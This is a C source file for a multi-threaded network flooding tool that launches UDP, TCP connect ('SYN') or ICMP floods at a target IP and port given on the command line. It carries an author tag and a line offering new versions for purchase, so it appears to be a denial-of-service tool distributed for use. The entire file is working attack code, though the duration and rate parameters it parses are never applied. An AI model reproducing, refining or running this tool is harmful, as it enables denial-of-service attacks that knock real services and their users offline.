#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <netinet/ip_icmp.h>

// Global variables
volatile int running = 1; // Global flag to control thread execution

// Structure to store attack parameters
struct AttackParams {
    char target_ip[16];      // Target IP address (e.g., "192.168.1.1")
    int target_port;         // Target port (e.g., 80)
    int attack_duration;     // Attack duration in seconds (e.g., 60)
    int packet_size;         // Packet size in bytes (e.g., 1024)
    int num_threads;         // Number of threads
    char attack_type[20];    // Type of attack (e.g., "UDP", "TCP", "ICMP")
    int intensity;           // Attack intensity (packets per second)
};

// Signal handler for SIGINT (Ctrl+C)
void handle_sigint(int sig) {
    running = 0; // Set running flag to 0 to stop threads
}

// UDP Flood attack
void udp_flood(struct AttackParams *params) {
    int sockfd;
    struct sockaddr_in server_addr;
    char payload[params->packet_size];

    // Create UDP socket
    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("UDP Socket creation failed");
        return;
    }

    // Configure server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(params->target_port);
    server_addr.sin_addr.s_addr = inet_addr(params->target_ip);

    while (running) {
        // Send UDP packets as fast as possible
        if (sendto(sockfd, payload, params->packet_size, 0,
                   (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            perror("UDP Sendto failed");
            break;
        }
    }

    close(sockfd);
}

// TCP SYN Flood attack
void tcp_syn_flood(struct AttackParams *params) {
    int sockfd;
    struct sockaddr_in server_addr;

    // Create TCP socket
    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("TCP Socket creation failed");
        return;
    }

    // Configure server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(params->target_port);
    server_addr.sin_addr.s_addr = inet_addr(params->target_ip);

    while (running) {
        // Send TCP SYN packets
        if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            perror("TCP Connect failed");
        }
        close(sockfd);
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
    }

    close(sockfd);
}

// ICMP Flood attack
void icmp_flood(struct AttackParams *params) {
    int sockfd;
    struct sockaddr_in server_addr;
    char packet[params->packet_size];

    // Create raw socket for ICMP
    if ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) < 0) {
        perror("ICMP Socket creation failed");
        return;
    }

    // Configure server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = inet_addr(params->target_ip);

    while (running) {
        // Send ICMP packets as fast as possible
        if (sendto(sockfd, packet, params->packet_size, 0,
                   (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            perror("ICMP Sendto failed");
            break;
        }
    }

    close(sockfd);
}

// Thread function
void *thread_function(void *arg) {
    struct AttackParams *params = (struct AttackParams *)arg;

    if (strcmp(params->attack_type, "UDP") == 0) {
        udp_flood(params);
    } else if (strcmp(params->attack_type, "TCP") == 0) {
        tcp_syn_flood(params);
    } else if (strcmp(params->attack_type, "ICMP") == 0) {
        icmp_flood(params);
    } else {
        printf("Invalid attack type: %s\n", params->attack_type);
    }

    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 7) {
        printf("Usage: %s <ip> <port> <duration> <threads> <attack_type> <intensity>\n", argv[0]);
        printf("Example: %s 192.168.1.1 80 60 1200 UDP 1000\n", argv[0]);
        printf("Attack Types: UDP, TCP, ICMP\n");
        printf("Intensity: Packets per second (e.g., 1000)\n");
        return 1;
    }

    // Parse command-line arguments
    struct AttackParams params;
    strncpy(params.target_ip, argv[1], 16);
    params.target_port = atoi(argv[2]);
    params.attack_duration = atoi(argv[3]);
    params.num_threads = atoi(argv[4]);
    strncpy(params.attack_type, argv[5], 20);
    params.intensity = atoi(argv[6]);
    params.packet_size = 1024; // Fixed packet size

    // Print program start message
    printf("MADE BY @NOOB_AM\n");
    printf("Target: %s:%d\n", params.target_ip, params.target_port);
    printf("Duration: %d seconds\n", params.attack_duration);
    printf("Threads: %d\n", params.num_threads);
    printf("Attack Type: %s\n", params.attack_type);
    printf("Intensity: %d packets/sec\n", params.intensity);

    // Register signal handler for SIGINT (Ctrl+C)
    signal(SIGINT, handle_sigint);

    pthread_t threads[params.num_threads];
    int rc;
    long t;

    // Create threads
    for (t = 0; t < params.num_threads; t++) {
        rc = pthread_create(&threads[t], NULL, thread_function, (void *)&params);
        if (rc) {
            printf("ERROR; return code from pthread_create() is %d\n", rc);
            return -1;
        }
    }

    // Wait for all threads to complete
    for (t = 0; t < params.num_threads; t++) {
        pthread_join(threads[t], NULL);
    }

    // Print attack finish message
    printf("Thanx for using. For buying new, contact @NOOB_AM\n");

    return 0;
}